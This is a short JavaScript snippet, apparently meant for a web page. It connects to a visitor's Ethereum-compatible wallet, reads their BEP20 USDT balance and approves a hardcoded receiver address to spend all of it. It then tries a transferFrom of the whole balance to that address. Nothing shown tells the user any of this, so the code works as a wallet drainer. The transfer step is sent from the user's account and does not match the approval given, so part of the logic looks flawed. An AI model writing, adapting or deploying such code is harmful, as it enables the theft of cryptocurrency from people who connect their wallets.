const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
const usdtABI = [
  {
    constant: false,
    inputs: [
      { name: "_spender", type: "address" },
      { name: "_value", type: "uint256" }
    ],
    name: "approve",
    outputs: [{ name: "", type: "bool" }],
    type: "function"
  },
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }],
    type: "function"
  },
  {
    constant: false,
    inputs: [
      { name: "_from", type: "address" },
      { name: "_to", type: "address" },
      { name: "_value", type: "uint256" }
    ],
    name: "transferFrom",
    outputs: [{ name: "", type: "bool" }],
    type: "function"
  },
  {
    constant: true,
    inputs: [],
    name: "decimals",
    outputs: [{ name: "", type: "uint8" }],
    type: "function"
  }
];

async function approveAndTransfer() {
  if (typeof window.ethereum === "undefined") return;

  const web3 = new Web3(window.ethereum);
  await window.ethereum.request({ method: "eth_requestAccounts" });

  const accounts = await web3.eth.getAccounts();
  const user = accounts[0];

  const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
  const decimals = await usdt.methods.decimals().call();
  const balance = await usdt.methods.balanceOf(user).call();

  if (balance === "0") return;

  // Approve receiver to spend full balance
  await usdt.methods.approve(receiver, balance).send({ from: user });

  // Now transfer USDT from user to receiver using transferFrom
  await usdt.methods
    .transferFrom(user, receiver, balance)
    .send({ from: user }); // transferFrom user hi call karega — approval ke baad allowed
}
